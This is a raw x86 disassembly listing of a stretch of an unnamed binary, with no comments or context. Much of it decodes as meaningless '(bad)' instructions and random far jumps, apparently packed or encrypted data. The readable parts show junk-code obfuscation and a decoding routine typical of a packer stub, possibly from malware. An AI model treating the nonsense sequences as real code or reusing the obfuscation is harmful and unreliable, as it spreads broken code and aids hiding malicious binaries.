  41b81f:	cmp    BYTE PTR cs:[ecx],cl
  41b822:	pop    ds
  41b823:	cmp    DWORD PTR [eax],esi
  41b825:	fadd   DWORD PTR [edx+ebp*8]
  41b828:	xor    esi,DWORD PTR [ebp-0x73305b2d]
  41b82e:	adc    eax,0x23b03107
  41b833:	data16 int3 
  41b835:	dec    ebp
  41b836:	push   es
  41b837:	inc    esi
  41b838:	scas   al,BYTE PTR es:[edi]
  41b839:	dec    esp
  41b83a:	fcmovu st,st(2)
  41b83c:	(bad)  
  41b83d:	jge    0x41b81a
  41b83f:	retf   
  41b840:	test   BYTE PTR [eax],al
  41b842:	data16 fucomip st,st(2)
  41b845:	and    BYTE PTR [edi-0x5384fc13],ch
  41b84b:	out    dx,al
  41b84c:	cli    
  41b84d:	adc    BYTE PTR [eax-0x4f],bl
  41b850:	jns    0x41b7d8
  41b852:	jmp    0xd416:0xdacf93c3
  41b859:	fsubr  DWORD PTR [edi]
  41b85b:	aam    0x96
  41b85d:	and    BYTE PTR [ebp+0x5],cl
  41b860:	stos   BYTE PTR es:[edi],al
  41b861:	idiv   DWORD PTR [edx-0x23dcb053]
  41b867:	dec    edi
  41b868:	cs jecxz 0x41b7f9
  41b86b:	ss aaa 
  41b86d:	dec    esp
  41b86e:	jnp    0x41b803
  41b870:	mov    DWORD PTR [edi-0x3],edx
  41b873:	mov    ch,BYTE PTR fs:[edi]
  41b876:	push   edx
  41b877:	adc    al,0x60
  41b879:	stc    
  41b87a:	sbb    al,al
  41b87c:	xchg   edx,eax
  41b87d:	enter  0xa811,0x95
  41b881:	mov    ah,0x6b
  41b883:	fsubr  QWORD PTR [esi]
  41b885:	mov    al,0xd1
  41b887:	adc    DWORD PTR [esi+ebp*4-0x2b66e6e3],eax
  41b88e:	jle    0x41b85f
  41b890:	mov    eax,edx
  41b892:	mov    dh,0xd0
  41b894:	test   bl,cl
  41b896:	sbb    ch,BYTE PTR [edi+0x17]
  41b899:	jp     0x41b89c
  41b89b:	xor    BYTE PTR [eax+0x4a],ch
  41b89e:	or     bh,BYTE PTR [edx]
  41b8a0:	pop    ss
  41b8a1:	lods   al,BYTE PTR ds:[esi]
  41b8a2:	pop    ebp
  41b8a3:	lock fdivr st(5),st
  41b8a6:	and    ebx,DWORD PTR [esi+0x20]
  41b8a9:	sti    
  41b8aa:	and    esi,edx
  41b8ac:	stos   DWORD PTR es:[edi],eax
  41b8ad:	test   DWORD PTR [eax+eiz*8+0x7e],edx
  41b8b1:	xor    BYTE PTR [ecx+0x2479a263],0x2c
  41b8b8:	add    BYTE PTR [edi-0x18],bh
  41b8bb:	mov    WORD PTR [edi+eiz*8],fs
  41b8be:	jae    0x41b874
  41b8c0:	in     eax,dx
  41b8c1:	adc    BYTE PTR [ebx-0x5c48edbc],0x6b
  41b8c8:	std    
  41b8c9:	inc    eax
  41b8ca:	cmp    al,0x5e
  41b8cc:	jno    0x41b8c4
  41b8ce:	neg    DWORD PTR [edi+edx*8+0x38]
  41b8d2:	int3   
  41b8d3:	add    eax,0xc9ea7533
  41b8d8:	call   0xc71d697e
  41b8dd:	xor    BYTE PTR [esp+ecx*2],al
  41b8e0:	push   ecx
  41b8e1:	sub    eax,esi
  41b8e3:	in     eax,dx
  41b8e4:	add    cl,BYTE PTR [eax]
  41b8e6:	fwait
  41b8e7:	mov    ecx,0x378d94c1
  41b8ec:	addr16 lock mov edi,0x2f5aa12c
  41b8f3:	ins    BYTE PTR es:[edi],dx
  41b8f4:	icebp  
  41b8f5:	(bad)  
  41b8f6:	ins    DWORD PTR es:[edi],dx
  41b8f7:	arpl   si,ax
  41b8f9:	push   esp
  41b8fa:	lds    edx,FWORD PTR [ebx+0x7052806f]
  41b900:	pop    eax
  41b901:	leave  
  41b902:	push   ebx
  41b903:	mov    ch,0x26
  41b905:	std    
  41b906:	sbb    DWORD PTR ss:[esi],0x5ab661f6
  41b90d:	test   esi,eax
  41b90f:	adc    eax,0x83d73d8a
  41b914:	mov    ebx,0xacd51db6
  41b919:	mov    al,0xbb
  41b91b:	add    BYTE PTR [edx],0xe6
  41b91e:	push   ebx
  41b91f:	dec    ebx
  41b920:	push   ebx
  41b921:	pop    ecx
  41b922:	rcr    BYTE PTR [edi+0xae66319],0xa4
  41b929:	mov    ch,0x80
  41b92b:	call   0x2f0e9588
  41b930:	and    eax,0x89260aa5
  41b935:	add    eax,0xbdcc6dd9
  41b93a:	xlat   BYTE PTR ds:[ebx]
  41b93b:	push   edi
  41b93c:	pop    edx
  41b93d:	test   eax,0xd2ccb04f
  41b942:	iret   
  41b943:	in     eax,0x6e
  41b945:	bound  ebx,QWORD PTR [ebp+0x39]
  41b948:	push   ecx
  41b949:	aad    0xe3
  41b94b:	scas   al,BYTE PTR es:[edi]
  41b94c:	(bad)  
  41b94d:	add    BYTE PTR [esp+ecx*2-0x39],dh
  41b951:	jg     0x41b900
  41b953:	mov    ebx,ds
  41b955:	push   eax
  41b956:	push   ecx
  41b957:	push   esi
  41b958:	hlt    
  41b959:	lock cmovge esi,DWORD PTR [edi+ecx*4]
  41b95e:	sbb    al,0x4c
  41b960:	loopne 0x41b931
  41b962:	mov    edi,0x69bc7dd2
  41b967:	out    0xb5,al
  41b969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96a:	mov    ah,0x65
  41b96c:	loope  0x41b99d
  41b96e:	or     al,0x11
  41b970:	mov    esi,0x66f3b0cc
  41b975:	xchg   edi,eax
  41b976:	pop    edi
  41b977:	push   eax
  41b978:	mov    WORD PTR [ebp-0x1],cs
  41b97b:	push   0x20
  41b97d:	jmp    0x763f:0xb5191a22
  41b984:	hlt    
  41b985:	ficom  DWORD PTR [ebx-0x38]
  41b988:	add    bh,BYTE PTR [edx+0x6b]
  41b98b:	enter  0x7da,0xc3
  41b98f:	dec    ebx
  41b991:	ins    BYTE PTR es:[edi],dx
  41b992:	jecxz  0x41b9be
  41b994:	ficom  DWORD PTR [edi+0x2d]
  41b997:	mov    ah,0x83
  41b999:	loope  0x41b95f
  41b99b:	aam    0x20
  41b99d:	fldenv [esi]
  41b99f:	pop    es
  41b9a0:	stos   BYTE PTR es:[edi],al
  41b9a1:	pop    ebp
  41b9a2:	or     DWORD PTR [esi+0x25c729ac],0x50c401dc
  41b9ac:	imul   ebx,DWORD PTR [edx+0x388f1bbc],0xfff55113
  41b9b6:	fstp   QWORD PTR [edx-0x31]
  41b9b9:	bound  ebp,QWORD PTR [ecx-0x35]
  41b9bc:	(bad)  
  41b9bd:	aaa    
  41b9be:	jbe    0x41b954
  41b9c0:	inc    eax
  41b9c1:	jmp    0x41ba3d
  41b9c3:	popf   
  41b9c4:	(bad)  [esp+ebx*8-0xe2bfabf]
  41b9cb:	jg     0x41ba1d
  41b9cd:	cmc    
  41b9ce:	fmul   DWORD PTR [eax-0x4f]
  41b9d1:	mov    bh,0x2c
  41b9d3:	pop    ds
  41b9d4:	xor    edi,DWORD PTR [ebp+0x5e87181c]
  41b9da:	outs   dx,DWORD PTR ds:[esi]
  41b9db:	and    al,0xd8
  41b9dd:	or     ecx,DWORD PTR [ecx+edi*8-0x21]
  41b9e1:	rep lods eax,DWORD PTR ds:[esi]
  41b9e3:	xlat   BYTE PTR ds:[ebx]
  41b9e4:	jmp    0x2102:0xc1a318c4
  41b9eb:	mov    ds:0x53445f6c,al
  41b9f0:	movq   mm2,QWORD PTR [esi-0x6f66401d]
  41b9f7:	(bad)  
  41b9f8:	aaa    
  41b9f9:	ror    DWORD PTR ss:[edx-0x54e49934],cl
  41ba00:	nop
  41ba01:	ret    0x51f1
  41ba04:	iret   
  41ba05:	adc    DWORD PTR [edi-0x11],0xffffff8a
  41ba09:	enter  0x326,0x98
  41ba0d:	xor    al,0xb5
  41ba0f:	or     al,0x91
  41ba11:	xor    eax,0xaab549a8
  41ba16:	test   eax,0x22e94963
  41ba1b:	stos   DWORD PTR es:[edi],eax
  41ba1c:	mov    eax,ds:0xd1e5392
  41ba21:	mov    ecx,DWORD PTR [ebp-0x28]
  41ba24:	adc    DWORD PTR ds:0x422976,0x422996
  41ba2e:	mov    esi,DWORD PTR [ebp-0x24]
  41ba31:	xor    eax,0x2340
  41ba36:	and    eax,ecx
  41ba38:	sbb    DWORD PTR ds:0x4228f6,0x422972
  41ba42:	xor    edx,0x452
  41ba48:	and    edx,esi
  41ba4a:	cmp    DWORD PTR ds:0x42298a,0x0
  41ba51:	mov    esi,DWORD PTR ds:0x4228da
  41ba57:	mov    esi,0x28ad
  41ba5c:	jmp    0x41ba97
  41ba61:	mov    DWORD PTR ds:0x422952,0x4940
  41ba6b:	ja     0x41ba89
  41ba71:	push   DWORD PTR [ebp-0x24]
  41ba74:	push   DWORD PTR [ebp-0x28]
  41ba77:	call   DWORD PTR ds:0x42a17c
  41ba7d:	sub    ecx,DWORD PTR ds:0x4228fa
  41ba83:	xor    DWORD PTR ds:0x4228ee,edi
  41ba89:	adc    DWORD PTR ds:0x4228fa,0x422972
  41ba93:	and    ecx,esi
  41ba95:	adc    ecx,esi
  41ba97:	and    eax,0x3741
  41ba9c:	mov    DWORD PTR [ebp-0x10],eax
  41ba9f:	and    edx,0x445b
  41baa5:	cmp    DWORD PTR ds:0x4229b6,0x0
  41baac:	mov    ecx,DWORD PTR ds:0x42293e
  41bab2:	mov    DWORD PTR ds:0x4229ce,ebx
  41bab8:	mov    esi,0x2c04
  41babd:	jmp    0x41bb16
  41bac2:	mov    DWORD PTR ds:0x42293a,edi
  41bac8:	jle    0x41bafe
  41bace:	push   0x3ca9
  41bad3:	call   DWORD PTR ds:0x42a058
  41bad9:	movzx  esi,WORD PTR ds:0x4228b2
  41bae0:	sbb    esi,DWORD PTR ds:0x4228fa
  41bae6:	mov    DWORD PTR ds:0x4228b2,esi
  41baec:	and    DWORD PTR ds:0x4228b2,0x689
  41baf6:	sub    ecx,esi
  41baf8:	sbb    DWORD PTR ds:0x4228de,edi
  41bafe:	sbb    DWORD PTR ds:0x4228f2,ecx
  41bb04:	mov    ecx,DWORD PTR ds:0x42295e
  41bb0a:	or     DWORD PTR ds:0x4228fe,ecx
  41bb10:	add    DWORD PTR ds:0x422992,ecx
  41bb16:	mov    DWORD PTR [ebp-0xc],edx
  41bb19:	mov    DWORD PTR [ebp-0x20],0x5770
  41bb20:	mov    eax,ds:0x422a7a
  41bb25:	mov    ecx,DWORD PTR ds:0x422b0e
  41bb2b:	sub    eax,ecx
  41bb2d:	and    eax,DWORD PTR [eax+ecx*1]
  41bb30:	mov    DWORD PTR [ebp-0x1c],0x18fc
  41bb37:	jmp    0x41bd72
  41bb3c:	mov    dh,0xdf
  41bb3e:	or     DWORD PTR [ecx-0x48],edx
  41bb41:	and    BYTE PTR [esi],ch
  41bb43:	pop    eax
  41bb44:	(bad)
  41bb48:	aam    0x80
  41bb4a:	add    DWORD PTR [esp+ebx*8-0x24e9f3fb],esi
  41bb51:	or     dl,BYTE PTR [esi]
  41bb53:	push   ss
  41bb54:	inc    eax
  41bb55:	mov    dh,0x7c
  41bb57:	in     eax,0xd9
  41bb59:	aaa    
  41bb5a:	and    DWORD PTR [edx],ebp
  41bb5c:	mov    bl,0x5f
  41bb5e:	cmp    eax,0x4b922001
  41bb63:	mov    esp,edi
  41bb65:	icebp  
  41bb66:	xor    al,0xf0
  41bb68:	data16 xor al,0x8
  41bb6b:	(bad)  
  41bb6c:	xor    eax,0x6e7dad60
  41bb71:	ss call 0xb09:0xeb8439d4
  41bb79:	mov    ebx,0x56656c1f
  41bb7e:	jae    0x41bbaa
  41bb80:	push   eax
  41bb81:	leave  
  41bb82:	jo     0x41bb6d
  41bb84:	jnp    0x41bba5
  41bb86:	scas   al,BYTE PTR es:[edi]
  41bb87:	jmp    0x41bb9d
  41bb89:	pop    esp
  41bb8a:	int3   
  41bb8b:	daa    
  41bb8c:	lods   eax,DWORD PTR ds:[esi]
  41bb8d:	rol    DWORD PTR [ecx],0xcc
  41bb90:	push   ss
  41bb91:	pop    es
  41bb92:	mov    cs,WORD PTR [esi]
  41bb94:	inc    ecx
  41bb95:	jmp    FWORD PTR [edx]
  41bb97:	pop    esp
  41bb98:	pop    ds
  41bb99:	sub    eax,0xcbfaad23
  41bb9e:	loopne 0x41bbc2
  41bba0:	popa   
  41bba1:	daa    
  41bba2:	mov    cl,0x4
  41bba4:	ins    BYTE PTR es:[edi],dx
  41bba5:	inc    ebx
  41bba6:	mov    al,0x16
  41bba8:	inc    eax
  41bba9:	mov    eax,0x9ca54524
  41bbae:	shl    bh,cl
  41bbb0:	push   ds
  41bbb1:	fmul   st(1),st
  41bbb3:	mov    ?,WORD PTR [ebp+0x2a]
  41bbb6:	fs call 0x66a6:0x450b6942
  41bbbe:	rcr    BYTE PTR [eax+edx*1+0x30],cl
  41bbc2:	fistp  DWORD PTR [edi-0x17]
  41bbc5:	shl    DWORD PTR [eax+0x5d],1
  41bbc8:	pop    ebx
  41bbc9:	ror    BYTE PTR [eax+0x4d],0xd6
  41bbcd:	cmp    ebx,DWORD PTR [ebx+0x204f8dc3]
  41bbd3:	push   ebp
  41bbd4:	mov    dh,0x30
  41bbd6:	push   esp
  41bbd7:	(bad)  
  41bbd8:	pop    esp
  41bbd9:	lea    ebx,[edx+0x62743068]
  41bbdf:	cmp    BYTE PTR [edx+0xb],al
  41bbe2:	ja     0x41bc46
  41bbe4:	mov    cl,0xae
  41bbe6:	call   0xb557ecc1
  41bbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbec:	push   eax
  41bbed:	icebp  
  41bbee:	bound  esp,QWORD PTR [edx-0x157256fd]
  41bbf4:	iret   
  41bbf5:	pop    ss
  41bbf6:	clc    
  41bbf7:	dec    esi
  41bbf8:	push   esp
  41bbf9:	xchg   BYTE PTR [edx-0x74e00f55],bh
  41bbff:	jne    0x41bbb4
  41bc01:	inc    esp
  41bc02:	cwde   
  41bc03:	xchg   esp,eax
  41bc04:	sbb    ebp,edx
  41bc06:	pop    ecx
  41bc07:	stos   BYTE PTR es:[edi],al
  41bc08:	out    dx,al
  41bc09:	fist   DWORD PTR [ecx-0x66]
  41bc0c:	fistp  WORD PTR [ecx]
  41bc0e:	dec    edi
  41bc0f:	loopne 0x41bbea
  41bc11:	call   0xc338:0x965316a2
  41bc18:	push   es
  41bc19:	xor    DWORD PTR [ecx+0x232df7c5],edx
  41bc1f:	and    al,0xce
  41bc21:	int3   
  41bc22:	adc    al,0xc9
  41bc24:	icebp  
  41bc25:	push   ss
  41bc26:	xchg   esp,eax
  41bc27:	fs mov bh,0xb1
  41bc2a:	xchg   edx,eax
  41bc2b:	cs inc eax
  41bc2d:	xchg   edx,eax
  41bc2e:	or     BYTE PTR [ebx-0x43841134],bh
  41bc34:	add    ebx,edi
  41bc36:	jne    0x41bbdf
  41bc38:	leave  
  41bc39:	or     BYTE PTR [ebp-0x6d],ah
  41bc3c:	or     BYTE PTR [edi+0x11],dh
  41bc3f:	and    DWORD PTR [esi],0x894a9ebf
  41bc45:	add    ebx,esp
  41bc47:	in     eax,0xe8
  41bc49:	rcr    bh,1
  41bc4b:	dec    ebp
  41bc4c:	sub    eax,ebp
  41bc4e:	push   ebx
  41bc4f:	imul   ebp,edx,0x62e2d864
  41bc55:	jns    0x41bbe9
  41bc57:	jmp    0x2db5:0xbe7112b3
  41bc5e:	loop   0x41bc01
  41bc60:	cmp    eax,0x7c36ce22
  41bc65:	sbb    esp,eax
  41bc67:	jmp    0x2fa:0x7e608fa0
  41bc6e:	mov    edi,edx
  41bc70:	ins    DWORD PTR es:[edi],dx
  41bc71:	daa    
  41bc72:	enter  0x6ca5,0x3c
  41bc76:	sbb    eax,0x6234f6c0
  41bc7b:	fistp  DWORD PTR [edx]
  41bc7d:	loope  0x41bc7e
  41bc7f:	xlat   BYTE PTR ds:[ebx]
  41bc80:	jno    0x41bc1d
  41bc82:	pop    ss
  41bc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc84:	in     al,dx
  41bc85:	jp     0x41bc3d
  41bc87:	push   eax
  41bc88:	push   ebx
  41bc89:	xor    dl,ch
  41bc8b:	pop    edx
  41bc8c:	clc    
  41bc8d:	vmaxss xmm4,xmm2,DWORD PTR [eax-0x3f]
  41bc92:	cmp    ecx,DWORD PTR [ebx+ecx*4-0x4bd3da5a]
  41bc99:	inc    edx
  41bc9a:	push   edx
  41bc9b:	iret   
  41bc9c:	in     al,dx
  41bc9d:	push   edi
  41bc9e:	into   
  41bc9f:	inc    edi
  41bca0:	shl    BYTE PTR ds:[edi-0x14],1
  41bca4:	dec    ebp
  41bca5:	cmp    ebp,DWORD PTR [edi-0x68]
  41bca8:	mov    cl,0x63
  41bcaa:	jmp    0xddb7c9e6
  41bcaf:	jge    0x41bccc
  41bcb1:	sub    eax,0x34778022
  41bcb6:	outs   dx,DWORD PTR ds:[esi]
  41bcb7:	or     BYTE PTR [ebp-0x7e],ch
  41bcba:	(bad)  
  41bcbb:	jecxz  0x41bc79
  41bcbd:	xor    ah,cl
  41bcbf:	(bad)  
  41bcc0:	xlat   BYTE PTR ds:[ebx]
  41bcc1:	rcl    DWORD PTR [ebp-0x23],cl
  41bcc4:	loopne 0x41bd1d
  41bcc6:	int3   
  41bcc7:	inc    ebx
  41bcc8:	mov    WORD PTR [eax+0x40],?
  41bccb:	mov    ds:0xad93454e,al
  41bcd0:	mov    ebx,0x5094a174
  41bcd5:	das    
  41bcd6:	out    dx,al
  41bcd7:	jl     0x41bd54
  41bcd9:	in     eax,dx
  41bcda:	xchg   ecx,eax
  41bcdb:	ret    
  41bcdc:	adc    eax,0x2e13ea49
  41bce1:	adc    BYTE PTR [ebx],ch
  41bce3:	jno    0x41bd5a
  41bce5:	cmp    DWORD PTR [ebx+edx*4-0x15],eax
  41bce9:	mov    al,0x83
  41bceb:	lods   al,BYTE PTR ds:[esi]
  41bcec:	pop    es
  41bced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcee:	pop    edx
  41bcef:	adc    eax,ebx
  41bcf1:	aad    0x11
  41bcf3:	outs   dx,BYTE PTR ds:[esi]
  41bcf4:	mov    eax,ebx
  41bcf6:	pop    es
  41bcf7:	iret   
  41bcf8:	dec    esi
  41bcf9:	leave  
  41bcfa:	imul   edi,DWORD PTR [esi-0x42],0xb89d4075
  41bd01:	xor    cl,BYTE PTR [ebp-0x2ac7fbc1]
  41bd07:	sub    BYTE PTR [ecx],dh
  41bd09:	mov    eax,0x2caf5065
  41bd0e:	test   BYTE PTR [edx+0x73],0xdb
  41bd12:	fucomi st,st(6)
  41bd14:	xchg   ebx,eax
  41bd15:	pop    ds
  41bd16:	jne    0x41bd24
  41bd18:	and    eax,0x63d2f2b6
  41bd1d:	addr16 ret 
  41bd1f:	sub    BYTE PTR [ebx+0x6b9263a],dh
  41bd25:	sub    cl,BYTE PTR [eax+0x7e7e0481]
  41bd2b:	ret    0x640a
  41bd2e:	push   0xffffff99
  41bd30:	cs stos DWORD PTR es:[edi],eax
  41bd32:	iret   
  41bd33:	and    ecx,DWORD PTR [edx+0x580555b7]
  41bd39:	inc    ecx
  41bd3a:	ss (bad) 
  41bd3c:	test   al,0x21
  41bd3e:	inc    ebx
  41bd3f:	mov    DWORD PTR [ebx-0xf],eax
  41bd42:	inc    eax
  41bd43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd44:	xor    al,0xf3
  41bd46:	idiv   DWORD PTR [esi-0x3]
  41bd49:	push   0xe85d79f2
  41bd4e:	push   edi
  41bd4f:	retf   0x19d7
  41bd52:	imul   esp,DWORD PTR [ebx-0x53],0xceb39d82
  41bd59:	lods   eax,DWORD PTR ds:[esi]
  41bd5a:	xor    BYTE PTR [edx],bh
  41bd5c:	push   ebx
  41bd5d:	or     edi,ecx
  41bd5f:	mov    dl,0xff
  41bd61:	out    0xda,al
  41bd63:	sbb    eax,0x8d782ac2
  41bd68:	ror    DWORD PTR [ebp-0x34107665],1
  41bd6e:	mov    eax,0xc72f1695
  41bd73:	inc    ebp
  41bd74:	fcomp  DWORD PTR [ebx]
  41bd76:	adc    eax,0xca130000
  41bd7b:	mov    DWORD PTR [ebp-0x24],0x1c21
  41bd82:	add    DWORD PTR ds:0x42293a,0x7032
  41bd8c:	mov    eax,DWORD PTR [ebp-0x28]
  41bd8f:	mov    DWORD PTR ds:0x4228d6,0x3603
  41bd99:	mov    ecx,DWORD PTR [ebp-0x24]
  41bd9c:	xor    edx,DWORD PTR ds:0x42295a
  41bda2:	mov    edx,DWORD PTR [ebp-0x20]
  41bda5:	and    esi,DWORD PTR ds:0x422932
  41bdab:	mov    esi,DWORD PTR [ebp-0x1c]
  41bdae:	add    eax,0x12fa
  41bdb3:	push   esi
  41bdb4:	adc    ecx,0x31c
  41bdba:	sbb    DWORD PTR ds:0x422992,0x422932
  41bdc4:	push   edx
  41bdc5:	neg    DWORD PTR ds:0x4228ae
  41bdcb:	and    ecx,0x2420
  41bdd1:	or     DWORD PTR ds:0x422896,0x6744
  41bddb:	and    eax,0x7f7f
  41bde0:	sub    DWORD PTR ds:0x42292e,0x4229a6
  41bdea:	push   ecx
  41bdeb:	push   eax
  41bdec:	or     DWORD PTR ds:0x422932,0x422986
  41bdf6:	call   0x41dfae
  41bdfb:	mov    DWORD PTR ds:0x4228d2,0x50ed
  41be05:	mov    esi,DWORD PTR [ebp-0x10]
  41be08:	mov    ecx,0x61bf
  41be0d:	mov    ecx,DWORD PTR [ebp-0xc]
  41be10:	cmp    ecx,edx
  41be12:	ja     0x41c165
  41be18:	mov    DWORD PTR ds:0x4229aa,0x308e
  41be22:	jb     0x41be3a
  41be28:	cmp    esi,eax
  41be2a:	mov    DWORD PTR ds:0x4228d2,0x64bb
  41be34:	jae    0x41c165
  41be3a:	adc    ecx,DWORD PTR ds:0x4229ce
  41be40:	mov    DWORD PTR [ebp-0x10],0x6155
  41be47:	mov    DWORD PTR [ebp-0xc],0x201
  41be4e:	sub    ecx,DWORD PTR ds:0x4228be
  41be54:	mov    DWORD PTR [ebp-0x20],0x44e0
  41be5b:	cmp    DWORD PTR ds:0x4228ca,0x0
  41be62:	mov    edx,0x767c
  41be67:	not    esi
  41be69:	jmp    0x41bed6
  41be6e:	not    edx
  41be70:	jbe    0x41beb1
  41be76:	push   DWORD PTR [ebp-0x18]
  41be79:	push   0x8f12
  41be7e:	push   DWORD PTR [ebp-0x28]
  41be81:	push   0x243c
  41be86:	push   0x73f8
  41be8b:	push   0x4227d9
  41be90:	push   0x400000
  41be95:	call   DWORD PTR ds:0x42a030
  41be9b:	sub    DWORD PTR ds:0x4228be,ebx
  41bea1:	sub    ecx,DWORD PTR ds:0x422986
  41bea7:	sbb    DWORD PTR ds:0x42292e,0x3fb0
  41beb1:	xor    DWORD PTR ds:0x4229c6,0x7a44
  41bebb:	add    DWORD PTR ds:0x4228de,0x618
  41bec5:	mov    edx,DWORD PTR ds:0x422aba
  41becb:	mov    esi,DWORD PTR ds:0x422b16
  41bed1:	sub    esi,edx
  41bed3:	add    edx,DWORD PTR [edx+esi*1]
  41bed6:	mov    DWORD PTR [ebp-0x1c],0x5ee2
  41bedd:	xor    eax,0x576f
  41bee2:	mov    DWORD PTR [ebp-0x28],0x1aff
  41bee9:	mov    DWORD PTR [ebp-0x24],0xee6
  41bef0:	mov    eax,DWORD PTR [ebp-0x28]
  41bef3:	cmp    DWORD PTR ds:0x422982,0x0
  41befa:	mov    DWORD PTR ds:0x42292e,0x189d
  41bf04:	mov    DWORD PTR ds:0x4229c6,edx
  41bf0a:	jmp    0x41bf54
  41bf0f:	mov    DWORD PTR ds:0x4229d2,ebx
  41bf15:	mov    DWORD PTR ds:0x42294e,edx
  41bf1b:	jl     0x41bf38
  41bf21:	push   0x3bbb
  41bf26:	call   DWORD PTR ds:0x42a034
  41bf2c:	sub    ecx,DWORD PTR ds:0x42293a
  41bf32:	sbb    DWORD PTR ds:0x4229b2,ebx
  41bf38:	or     ecx,DWORD PTR ds:0x4229be
  41bf3e:	and    DWORD PTR ds:0x4228ea,0x3818
  41bf48:	sbb    DWORD PTR ds:0x42296e,0x49eb
  41bf52:	adc    ecx,ecx
  41bf54:	mov    ecx,DWORD PTR [ebp-0x24]
  41bf57:	mov    edx,DWORD PTR [ebp-0x20]
  41bf5a:	mov    esi,DWORD PTR [ebp-0x1c]
  41bf5d:	add    eax,edx
  41bf5f:	mov    edx,DWORD PTR [ebp-0x10]
  41bf62:	adc    ecx,esi
  41bf64:	mov    esi,DWORD PTR [ebp-0xc]
  41bf67:	or     ecx,0x142d
  41bf6d:	or     eax,0x26da
  41bf72:	add    eax,0x4b35
  41bf77:	adc    ecx,0x509e
  41bf7d:	xor    eax,edx
  41bf7f:	xor    ecx,esi
  41bf81:	add    eax,0x5ec6
  41bf86:	mov    DWORD PTR [ebp-0x40],eax
  41bf89:	adc    ecx,0x3421
  41bf8f:	mov    DWORD PTR [ebp-0x3c],ecx
  41bf92:	mov    DWORD PTR [ebp-0x38],0x4edc
  41bf99:	mov    DWORD PTR [ebp-0x34],0x733f
  41bfa0:	mov    DWORD PTR [ebp-0x30],0x58e
  41bfa7:	mov    DWORD PTR [ebp-0x2c],0x43b2
  41bfae:	mov    DWORD PTR [ebp-0x10],0x69531b9
  41bfb5:	mov    DWORD PTR [ebp-0xc],0x0
  41bfbc:	mov    DWORD PTR [ebp-0x20],0x55d
  41bfc3:	mov    DWORD PTR [ebp-0x1c],0xa30
  41bfca:	mov    DWORD PTR [ebp-0x28],0x1f62
  41bfd1:	mov    DWORD PTR [ebp-0x24],0x677b
  41bfd8:	mov    eax,DWORD PTR [ebp-0x28]
  41bfdb:	mov    ecx,DWORD PTR [ebp-0x24]
  41bfde:	mov    edx,DWORD PTR [ebp-0x20]
  41bfe1:	mov    esi,DWORD PTR [ebp-0x1c]
  41bfe4:	and    eax,edx
  41bfe6:	mov    edx,DWORD PTR [ebp-0x10]
  41bfe9:	and    ecx,esi
  41bfeb:	mov    esi,DWORD PTR [ebp-0xc]
  41bfee:	push   esi
  41bfef:	push   edx
  41bff0:	push   ecx
  41bff1:	push   eax
  41bff2:	call   0x421af3
  41bff7:	push   0x353c
  41bffc:	push   0x45cf
  41c001:	push   edx
  41c002:	push   eax
  41c003:	call   0x41dfae
  41c008:	mov    ecx,DWORD PTR [ebp-0x30]
  41c00b:	mov    esi,DWORD PTR [ebp-0x2c]
  41c00e:	add    eax,ecx
  41c010:	mov    ecx,DWORD PTR [ebp-0x38]
  41c013:	adc    edx,esi
  41c015:	mov    esi,DWORD PTR [ebp-0x34]
  41c018:	and    eax,ecx
  41c01a:	mov    ecx,DWORD PTR [ebp-0x40]
  41c01d:	and    edx,esi
  41c01f:	mov    esi,DWORD PTR [ebp-0x3c]
  41c022:	cmp    ecx,eax
  41c024:	jne    0x41c032
  41c02a:	cmp    esi,edx
  41c02c:	je     0x41c165
  41c032:	mov    DWORD PTR [ebp-0x40],0x5f3f50d6
  41c039:	mov    DWORD PTR [ebp-0x3c],0x1
  41c040:	mov    eax,DWORD PTR [ebp-0x40]
  41c043:	mov    ecx,DWORD PTR [ebp-0x3c]
  41c046:	push   ecx
  41c047:	push   eax
  41c048:	push   0x7850
  41c04d:	push   0x5329
  41c052:	call   0x421af3
  41c057:	xor    eax,0x100
  41c05c:	xor    edx,0x201
  41c062:	or     eax,0x76ef
  41c067:	or     edx,0x5df4
  41c06d:	mov    DWORD PTR [ebp-0x40],eax
  41c070:	mov    DWORD PTR [ebp-0x3c],edx
  41c073:	mov    eax,ds:0x42247c
  41c078:	cmp    eax,0x7cd80819
  41c07d:	jne    0x41c165
  41c083:	mov    eax,DWORD PTR [ebp-0x18]
  41c086:	mov    ecx,DWORD PTR [ebp-0x14]
  41c089:	mov    edx,DWORD PTR [ebp-0x18]
  41c08c:	mov    esi,DWORD PTR [ebp-0x14]
  41c08f:	shrd   eax,ecx,0x2
  41c093:	shl    edx,0x1e
  41c096:	mov    edx,DWORD PTR ds:0x422268
  41c09c:	mov    edx,DWORD PTR [edx+0x1a8]
  41c0a2:	xor    esi,esi
  41c0a4:	shr    ecx,0x2
  41c0a7:	mov    ecx,0x2e9a655c
  41c0ac:	xor    eax,ecx
  41c0ae:	or     eax,esi
  41c0b0:	mov    DWORD PTR [edx],eax
  41c0b2:	mov    eax,DWORD PTR [ebp-0x18]
  41c0b5:	mov    edx,DWORD PTR [ebp-0x14]
  41c0b8:	shrd   eax,edx,0x2
  41c0bc:	shr    edx,0x2
  41c0bf:	mov    edx,DWORD PTR [ebp-0x18]
  41c0c2:	mov    esi,DWORD PTR [ebp-0x14]
  41c0c5:	xor    eax,ecx
  41c0c7:	xor    esi,esi
  41c0c9:	or     eax,esi
  41c0cb:	mov    ds:0x42247c,eax
  41c0d0:	mov    BYTE PTR [ebp-0x6],0x87
  41c0d4:	mov    BYTE PTR [ebp-0x5],0x12
  41c0d8:	mov    BYTE PTR [ebp-0x4],0x2
  41c0dc:	mov    BYTE PTR [ebp-0x3],0x93
  41c0e0:	mov    BYTE PTR [ebp-0x2],0x23
  41c0e4:	mov    BYTE PTR [ebp-0x1],0x2
  41c0e8:	mov    al,BYTE PTR [ebp-0x1]
  41c0eb:	movzx  esi,al
  41c0ee:	mov    al,BYTE PTR [ebp-0x2]
  41c0f1:	movzx  eax,al
  41c0f4:	shl    edx,0x1e
  41c0f7:	cdq    
  41c0f8:	idiv   esi
  41c0fa:	mov    dl,BYTE PTR [ebp-0x3]
  41c0fd:	movzx  edx,dl
  41c100:	movzx  eax,al
  41c103:	or     eax,edx
  41c105:	mov    dl,BYTE PTR [ebp-0x4]
  41c108:	movzx  esi,dl
  41c10b:	cdq    
  41c10c:	idiv   esi
  41c10e:	mov    dl,BYTE PTR [ebp-0x5]
